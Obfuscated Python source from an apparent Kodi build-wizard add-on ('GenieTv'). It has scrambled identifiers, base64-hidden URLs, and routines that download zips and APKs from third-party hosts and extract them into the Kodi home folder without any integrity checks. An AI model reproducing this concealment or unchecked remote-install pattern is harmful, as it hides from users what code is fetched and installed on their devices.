 i1iiIIiiI111 . ok ( "[COLOR=white]Origin[/COLOR]" , "" , 'All Done !' , '' )
 if 85 - 85: OOooOOo . I1IiI / oOO . O0 % I1I1ii
 if 90 - 90: Oo % O0 * iIii1I11I1II1 . II1i1IiiIIi11
 if 8 - 8: oOO + OoOoOO00 / II1i1IiiIIi11 / OOoo0OO0
 if 74 - 74: O0 / i1IIi
def OoO ( ) :
 Iiiiii111i1ii = 1
 Ooo00OoOOO ( )
 i1i1iII1 = xbmc . translatePath ( os . path . join ( Oo0oooooOOO000Oo , 'Build Backup' , 'Full Backup' , '' ) )
 iii11i1IIII = xbmc . translatePath ( os . path . join ( Oo0oooooOOO000Oo , 'Build Backup' , 'my_full_backup.zip' ) )
 Ii = xbmc . translatePath ( os . path . join ( Oo0oooooOOO000Oo , 'Build Backup' , 'my_full_backup_GUI_Settings.zip' ) )
 if not os . path . exists ( i1i1iII1 ) :
  os . makedirs ( i1i1iII1 )
 o00iiI1Ii1 = oOOoo00O0O . input ( 'Enter a name for this backup' , type = xbmcgui . INPUT_ALPHANUM )
 if ( not o00iiI1Ii1 ) : return False , 0
 ii1i = o00iiI1Ii1
 oOOoo = xbmc . translatePath ( os . path . join ( i1i1iII1 , ii1i + '.zip' ) )
 iII1111III1I = [ 'plugin.video.GenieTv' ]
 ii11i = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' ]
 O00oOo00o0o = [ 'plugin.video.GenieTv' , 'repository.origin' , 'cache' , 'system' , 'Thumbnails' , "peripheral_data" , 'library' , 'keymaps' ]
 O00oO0 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , "Textures13.db" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'advancedsettings.xml' ]
 O0Oo00OoOo = "Creating full backup of existing build"
 ii1ii111 = "Creating Community Build"
 i11111I1I = "Archiving..."
 ii1Oo0000oOo = ""
 I11o0oO00oO0o0o0 = "Please Wait"
 I1I ( oooOOOOO , oOOoo , ii1ii111 , i11111I1I , ii1Oo0000oOo , I11o0oO00oO0o0o0 , O00oOo00o0o , O00oO0 )
 time . sleep ( 1 )
 ooooo = xbmc . translatePath ( os . path . join ( i1i1iII1 , ii1i + '_guisettings.zip' ) )
 i11IIIiI1I = zipfile . ZipFile ( ooooo , mode = 'w' )
 try :
  i11IIIiI1I . write ( xbmc . translatePath ( os . path . join ( oooOOOOO , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
 except : pass
 i11IIIiI1I . close ( )
 if Iiiiii111i1ii == 0 :
  i1iiIIiiI111 . ok ( "FAILED!" , 'The guisettings.xml file could not be found on your' , 'system, please reboot and try again.' , '' )
 else :
  i1iiIIiiI111 . ok ( "SUCCESS!" , 'You Are Now Backed Up. If you\'d like to share this build with' , 'the community please post details on the forum at' , '[COLOR=blue][B]http://rh-project.info[/COLOR][/B]' )
  i1iiIIiiI111 . ok ( "Build Locations" , 'Full Backup (only used to restore on this device): [COLOR=yellow]' + iii11i1IIII , '[/COLOR]Universal Backup (can be used on any device): [COLOR=yellow]' + oOOoo + '[/COLOR]' )
  if 69 - 69: O0
def I1I ( sourcefile , destfile , message_header , message1 , message2 , message3 , exclude_dirs , exclude_files ) :
 o0ooO = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 OoOOOo0o0ooo = len ( sourcefile )
 I1iiiiI1iI = [ ]
 iIiiiii1i = [ ]
 Oo0oO0ooo . create ( message_header , message1 , message2 , message3 )
 for iiIi1IIiI , i1oO0OO0 , o0O0Oo00 in os . walk ( sourcefile ) :
  for file in o0O0Oo00 :
   iIiiiii1i . append ( file )
 O0Oo0o000oO = len ( iIiiiii1i )
 for iiIi1IIiI , i1oO0OO0 , o0O0Oo00 in os . walk ( sourcefile ) :
  i1oO0OO0 [ : ] = [ oO0o00oOOooO0 for oO0o00oOOooO0 in i1oO0OO0 if oO0o00oOOooO0 not in exclude_dirs ]
  o0O0Oo00 [ : ] = [ ooOOo00O00Oo for ooOOo00O00Oo in o0O0Oo00 if ooOOo00O00Oo not in exclude_files ]
  for file in o0O0Oo00 :
   I1iiiiI1iI . append ( file )
   OOOoO000 = len ( I1iiiiI1iI ) / float ( O0Oo0o000oO ) * 100
   Oo0oO0ooo . update ( int ( OOOoO000 ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
   oOOOO = os . path . join ( iiIi1IIiI , file )
   if not 'temp' in i1oO0OO0 :
    if not 'plugin.program.originwizard' in i1oO0OO0 :
     import time
     IiIi1ii111i1 = '01/01/1980'
     i1i1i1I = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( oOOOO ) ) )
     if i1i1i1I > IiIi1ii111i1 :
      o0ooO . write ( oOOOO , oOOOO [ OoOOOo0o0ooo : ] )
 o0ooO . close ( )
 Oo0oO0ooo . close ( )
 if 83 - 83: Ooo0OO0oOO + OoooooooOO
 if 22 - 22: oO0O % II1i1IiiIIi11 * OoooooooOO - OOooOOo / iIii1I11I1II1
def OoOO00 ( ) :
 I1 ( )
 O00OOOoOoo0O ( '[COLORgreen]SCOOBY STREAMS[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvdHZjYXRzLnBocA==' ) ) , 1016 , ii11iIi1I + 'scoob.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]SCOOBY SCRAPES[/COLOR]' , iiI1IiI , 1024 , ii11iIi1I + 'scoob.png' , i1iiIII111ii , '' )
 if 28 - 28: Ooo0OO0oOO - i11iIiiIii . ii11ii1ii + iI1Ii11iII1 / ii11ii1ii
 if 35 - 35: iI1Ii11iII1
def OOoO0 ( ) :
 I1 ( )
 O00OOOoOoo0O ( '[COLORgreen]SEARCH MOVIES[/COLOR]' , iiI1IiI , 9001 , ii11iIi1I + 'MOVIESv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]SEARCH SERIES[/COLOR]' , iiI1IiI , 9002 , ii11iIi1I + 'TVSHOWSv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]SEARCH CARTOONS[/COLOR]' , '' , 10005 , ii11iIi1I + 'ORIGINCARTOON' , i1iiIII111ii , '' )
 if 86 - 86: OoOoOO00 % i11iIiiIii + oO0O % i11iIiiIii
 if 92 - 92: i11iIiiIii - II1i1IiiIIi11 / oOO / Ooo0OO0oOO
 if 43 - 43: OoOoOO00 + i11i1 + II1i1IiiIIi11
 if 40 - 40: OOooOOo
def OOOooo ( ) :
 I1 ( )
 O00OOOoOoo0O ( '[COLORgreen]RADIO[/COLOR]' , iiI1IiI , 1013 , ii11iIi1I + 'radio.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'CONCERTS' ) == 'true' :
  O00OOOoOoo0O ( '[COLORgreen]CONCERTS[/COLOR]' , ( i1111 ( 'aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2Z1bGxjb25jZXJ0cy8=' ) ) , 7050 , ii11iIi1I + 'concerts.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]MUSIC[/COLOR]' , iiI1IiI , 1030 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]MUSIC ARCHIVE[/COLOR]' , iiI1IiI + ( i1111 ( 'L3ZvZC91cmxzL211c2ljLnBocA==' ) ) , 1010 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]MUSIC SEARCH[/COLOR]' , iiI1IiI , 1111 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]KODIBLE AUDIO BOOKS[/COLOR]' , 'http://doremisa.com/audiobooks/' , 30000 , ii11iIi1I + 'kodible.png' , i1iiIII111ii , '' )
 if 99 - 99: OoOoOO00 * iI1Ii11iII1 % iIii1I11I1II1 / oO0O
 Oo0oO ( 'movies' , 'MAIN' )
 if 90 - 90: Ooo0OO0oOO % i11i1 - i11i1 % OoOoOO00 * Ooo00oOo00o
def iIi1iI111I ( ) :
 I1 ( )
 if 85 - 85: OoooooooOO * iIii1I11I1II1 . II1i1IiiIIi11 / OoooooooOO % OOOo0 % O0
 ooo00OOOooO ( 'DELETE CACHE' , 'url' , 14 , ii11iIi1I + 'MAIN5.png' , i1iiIII111ii , '' )
 ooo00OOOooO ( 'DELETE PACKAGES' , 'url' , 6 , ii11iIi1I + 'MAIN4.png' , i1iiIII111ii , '' )
 ooo00OOOooO ( 'FORCE REFRESH' , 'url' , 10 , ii11iIi1I + 'MAIN3.png' , i1iiIII111ii , 'Force Refresh All Repos' )
 if 36 - 36: oO0O / OoOoOO00 / iI1Ii11iII1 / iI1Ii11iII1 + ii11ii1ii
 ooo00OOOooO ( 'CHECK MY IP' , 'url' , 12 , ii11iIi1I + 'MAIN2.png' , i1iiIII111ii , '' )
 ooo00OOOooO ( 'ANDROID ONLY DELETE TEXTURE13.DB&THUBMNAIL FOLDER' , 'url' , 13 , ii11iIi1I + 'MAIN1.png' , i1iiIII111ii , 'Only Works On Android On Windows It Deletes Your Thumnails Folder But Does Not Delete The Textures13.db' )
 O00OOOoOoo0O ( '[COLORgreen]ADVANCED SETTINGS XML[/COLOR]' , iiI1IiI , 4 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]URL FIXES[/COLOR]' , iiI1IiI , 20 , ii11iIi1I + 'URLFIX.png' , i1iiIII111ii , '' )
 Oo0oO ( 'movies' , 'MAIN' )
 if 95 - 95: iI1Ii11iII1
 if 51 - 51: OoOoOO00 + iI1Ii11iII1 . i1IIi . ii11ii1ii + I1IiI * OOOo0
def iI1Ii11111iIi ( ) :
 I1 ( )
 O00OOOoOoo0O ( '[COLORgreen]REPOS[/COLOR]' , ( i1111 ( 'aHR0cDovL21pcnJvcnMua29kaS50di9hZGRvbnMv' ) ) , 2030 , ii11iIi1I + 'repos.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]NEW[/COLOR]' , iiI1IiI , 22 , ii11iIi1I + 'NEW.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]IPTV[/COLOR]' , iiI1IiI , 23 , ii11iIi1I + 'IPTV.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]VIDEO[/COLOR]' , iiI1IiI , 24 , ii11iIi1I + 'VIDEO.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]SPORTS[/COLOR]' , iiI1IiI , 25 , ii11iIi1I + 'SPORTS.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]KIDS[/COLOR]' , iiI1IiI , 26 , ii11iIi1I + 'KIDS.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]MUSIC[/COLOR]' , iiI1IiI , 27 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]PROGRAMS[/COLOR]' , iiI1IiI , 28 , ii11iIi1I + 'PROGRAMS.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]XXX[/COLOR]' , 'URL' , 29 , ii11iIi1I + 'XXX.png' , i1iiIII111ii , '' )
 Oo0oO ( 'movies' , 'MAIN' )
 if 72 - 72: Ooo0OO0oOO + Ooo0OO0oOO / OoOoOO00 . OoooooooOO % oO0O
 if 49 - 49: Ooo0OO0oOO . Ooo00oOo00o - Oo * OoooooooOO . Oo
def ii1Ii1IiIIi ( ) :
 I1 ( )
 ooo00OOOooO ( 'CHECK ADVANCED XML' , iiI1IiI , 8 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 ooo00OOOooO ( 'MUCKYS XML' , iiI1IiI + '/wizard/muckys.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 ooo00OOOooO ( '0CACHE XML' , iiI1IiI + '/wizard/0cache.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 ooo00OOOooO ( 'MIKEY1234 XML' , iiI1IiI + '/wizard/mikey.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 ooo00OOOooO ( 'TUXENS XML' , iiI1IiI + '/wizard/tuxens.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 ooo00OOOooO ( 'P2P RECOMMENDED XML1' , iiI1IiI + '/wizard/p2p1.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 ooo00OOOooO ( 'P2P RECOMMENDED XML2' , iiI1IiI + '/wizard/p2p2.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 ooo00OOOooO ( 'DELETE XML' , iiI1IiI , 11 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 Oo0oO ( 'movies' , 'MAIN' )
 if 83 - 83: OOoo0OO0 / ii11ii1ii
def II1Ii11Ii1i1I ( ) :
 I1 ( )
 ooo00OOOooO ( '[COLORgreen]My Local Zip[/COLOR]' , I11 , 48 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 ooo00OOOooO ( '[COLORgreen]My Online Zip[/COLOR]' , i11 , 43 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 if 17 - 17: i11iIiiIii - OoOoOO00 * OOooOOo
def IIi1IIIIi ( ) :
 I1 ( )
 ooo00OOOooO ( 'INSTALL FTV GUIDE AND OTHER ADDONS REQUIRED' , iiI1IiI + '/wizard/customftv/ftvguide-addons.zip' , 5 , ii11iIi1I + 'FTV4.png' , i1iiIII111ii , '' )
 ooo00OOOooO ( 'FTV GUIDE FIRST RUN SETTINGS' , iiI1IiI + '/wizard/customftv/settings.xml' , 17 , ii11iIi1I + 'FTV3.png' , i1iiIII111ii , '' )
 ooo00OOOooO ( 'FTV GUIDE ADDONS2.INI UPDATE DAILY' , 'http://ren.byethost12.com/addons2.ini' , 16 , ii11iIi1I + 'FTV1.png' , i1iiIII111ii , '' )
 ooo00OOOooO ( 'RESET FTV DATABASE' , 'url' , 18 , ii11iIi1I + 'FTV2.png' , i1iiIII111ii , '' )
 if 70 - 70: i11i1 / OoOoOO00 - iIii1I11I1II1 - II1i1IiiIIi11
 if 11 - 11: iIii1I11I1II1 . OoooooooOO . OoOoOO00 / i1IIi - OOoo0OO0
 if 30 - 30: I1IiI
def Ii111 ( ) :
 I1 ( )
 O00OOOoOoo0O ( '[COLORgreen]SKINS[/COLOR]' , iiI1IiI , 33 , ii11iIi1I + 'skinp.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]ARTWORK PACKS[/COLOR]' , iiI1IiI , 34 , ii11iIi1I + 'artp.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]CREATE UNIVERSAL PATHS[/COLOR]' , oooOOOOO , 35 , ii11iIi1I + 'GUI.png' , i1iiIII111ii , '' )
 Oo0oO ( 'movies' , 'MAIN' )
 if 67 - 67: O0
def Oooooooo0o ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI11I1i1i1iI ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 5 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 60 - 60: OoooooooOO % Oo + i11i1 . oOO * iIii1I11I1II1
def oooo00 ( ) :
 I1 ( )
 O00OOOoOoo0O ( '[COLORgreen]GOTHAM SKINS[/COLOR]' , iiI1IiI , 36 , ii11iIi1I + 'GSKIN.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]HELIX SKINS[/COLOR]' , iiI1IiI , 37 , ii11iIi1I + 'HSKIN.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]ISENGAARD SKINS[/COLOR]' , oooOOOOO , 38 , ii11iIi1I + 'ISKIN.png' , i1iiIII111ii , '' )
 Oo0oO ( 'movies' , 'MAIN' )
 if 77 - 77: oOO - OOOo0 % OOoo0OO0 - O0
def o0O0O0 ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI1IiI + I11oo0ooOO ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 42 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 24 - 24: Ooo00oOo00o % Ooo00oOo00o * iIii1I11I1II1
def III ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI1IiI + iIiIi11Ii ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 42 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 23 - 23: Ooo0OO0oOO - i11i1 + OOoo0OO0
def II11 ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI1IiI + Iiii11iIi1 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 42 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 40 - 40: OOoo0OO0 % Ooo00oOo00o . I1I1ii
def OOO0oOOo00O ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( i1111 ( 'aHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3MvN2ZrMjhndDlwb3QxMjJhL0JVSUxEUy50eHQ/ZGw9MA==' ) ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 42 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 51 - 51: ii11ii1ii / iIii1I11I1II1 % Ooo0OO0oOO + OOooOOo * oOO + I1I1ii
def o0OoO00o0000O ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI1IiI + II11I ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 40 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 96 - 96: OOOo0 % Oo . ii11ii1ii + i11i1
def Ii11Iii1i1ii ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI1IiI + Ii1i1i1111 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 5 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 57 - 57: oO0O % OoOoOO00
def O00oOo ( ) :
 IIIII1II = iI1 ( i1111 ( 'aHR0cDovL2dlbmlldHYuY28udWsvcmVkby9hcGt0b29sL2Fway5waHA=' ) )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( IIIII1II )
 for I1i11i , IIii11Ii1i1I , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO , I1i11i , 2031 , IIii11Ii1i1I )
  if 30 - 30: OoooooooOO % OoooooooOO
def oOoOoo0 ( name , url , description ) :
 Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( ii1II , 'Download' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "Your App Is Downloading" , "Why not check out our website" , '' , 'Http://architects.x10host.com' )
 I1iiii = os . path . join ( Oo0OO0000oooo , name + '.apk' )
 try :
  os . remove ( I1iiii )
 except :
  pass
 downloader . download ( url , I1iiii , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "[COLORred]Please press ok, exit kodi and go to your downloads folder to install your app[/COLOR]" , "[COLORblue]Tool Brought To You By Architects@Work[/COLOR]" )
 if 51 - 51: O0 - i1IIi / OOOo0
def iI111i1I1II ( url ) :
 Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv/resources/downloads' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "Your fILM Is Downloading" , "Why not check out our website" , '' , 'Http://architects.x10host.com' )
 I1iiii = os . path . join ( Oo0OO0000oooo , OO0ooOOO0OOO + '.mp4' )
 try :
  os . remove ( I1iiii )
 except :
  pass
 downloader . download ( url , I1iiii , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "[COLORred]Please press ok, Your download With Be Avaiilable Via The My Downloads Button[/COLOR]" , "[COLORblue]Tool Brought To You By Architects@Work[/COLOR]" )
 if 96 - 96: I1I1ii / Oo * OoOoOO00 - II1i1IiiIIi11 * Oo
 if 81 - 81: iI1Ii11iII1 . OOooOOo / I1I1ii
def Iii111Ii ( name , url , description ) :
 Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "Your Art Pack Is Downloading" , "Why not check out our website" , '' , 'Http://architects.x10host.com' )
 I1iiii = os . path . join ( Oo0OO0000oooo , name )
 try :
  os . remove ( I1iiii )
 except :
  pass
 downloader . download ( url , I1iiii , Oo0oO0ooo )
 O0O00oOooo0OO = xbmc . translatePath ( os . path . join ( oo00 ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Placing Your Art Please Wait" )
 print '======================================='
 print O0O00oOooo0OO
 print '======================================='
 extract . all ( I1iiii , O0O00oOooo0OO , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "[COLORred]Once complete your artwork will be stored in your Media folder, Accessible via the Homefolder, Enjoy[/COLOR]" )
 if 23 - 23: Ooo0OO0oOO + Ooo00oOo00o
 if 2 - 2: Ooo0OO0oOO - oO0O - OOoo0OO0 - I1I1ii . iIii1I11I1II1
def o0OIIiI1I1 ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL2dlbmlldHYuY28udWsvcmVkby9HZW5pZVR2L3Rlc3Qvd2gudHh0' ) ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 5 , IiI , iI1ii1i , o0OoOO )
 try :
  oo0OoOOO0o0 = i11iIIIIIi1 ( I11I1IIiiII1 + oO0o0o0ooO0oO + IIIIIii1ii11 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
  for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
   O00OOOoOoo0O ( OO0ooOOO0OOO , url , 5 , IiI , iI1ii1i , o0OoOO )
 except : pass
 Oo0oO ( 'movies' , 'INFO' )
 if 86 - 86: I1IiI * OoOoOO00 - O0 . I1IiI % iIii1I11I1II1 / i11i1
 if 11 - 11: OOOo0 * Ooo0OO0oOO + ii11ii1ii / ii11ii1ii
def iiii1I1 ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL2dlbmlldHYuY28udWsvcmVkby9HZW5pZVR2L3Rlc3Qvd2gudHh0' ) ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 43 , IiI , iI1ii1i , o0OoOO )
 try :
  oo0OoOOO0o0 = i11iIIIIIi1 ( I11I1IIiiII1 + oO0o0o0ooO0oO + IIIIIii1ii11 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
  for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
   O00OOOoOoo0O ( OO0ooOOO0OOO , url , 43 , IiI , iI1ii1i , o0OoOO )
 except : pass
 Oo0oO ( 'movies' , 'INFO' )
 if 14 - 14: I1IiI * OOOo0 + OoooooooOO - II1i1IiiIIi11 - iI1Ii11iII1
 if 15 - 15: iI1Ii11iII1 / O0 . OOooOOo . i11iIiiIii
def o0OO0O0Oo ( name , url , description ) :
 Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "GenieTv" , "Downloading Content" , '' , 'Please Wait' )
 I1iiii = os . path . join ( Oo0OO0000oooo , name + '.zip' )
 try :
  os . remove ( I1iiii )
 except :
  pass
 downloader . download ( url , I1iiii , Oo0oO0ooo )
 OOOOO = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 print '======================================='
 print OOOOO
 print '======================================='
 extract . all ( I1iiii , OOOOO , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Press ok to finish install" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 o0Oo00 ( )
 if 67 - 67: Ooo0OO0oOO % OOooOOo . OoooooooOO + i11i1 * OOoo0OO0 * I1IiI
 if 36 - 36: O0 + Oo
def iIIIi1i1I11i ( name , url , description ) :
 Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "GenieTv" , "Downloading " , '' , 'Please Wait' )
 I1iiii = os . path . join ( Oo0OO0000oooo , 'plugin.program.GenieTv.install' + '.zip' )
 try :
  os . remove ( I1iiii )
 except :
  pass
 downloader . download ( url , I1iiii , Oo0oO0ooo )
 OOOOO = xbmc . translatePath ( os . path . join ( 'special://' , 'home' ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 print '======================================='
 print OOOOO
 print '======================================='
 extract . all ( I1iiii , OOOOO , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Press ok to force close kodi, if unsuccessful using windows Please kill kodi via taskmanager" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 oOO0OO0OO ( )
 if 87 - 87: Ooo0OO0oOO + iIii1I11I1II1 - OoooooooOO
def IiI1 ( name , url , description ) :
 Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
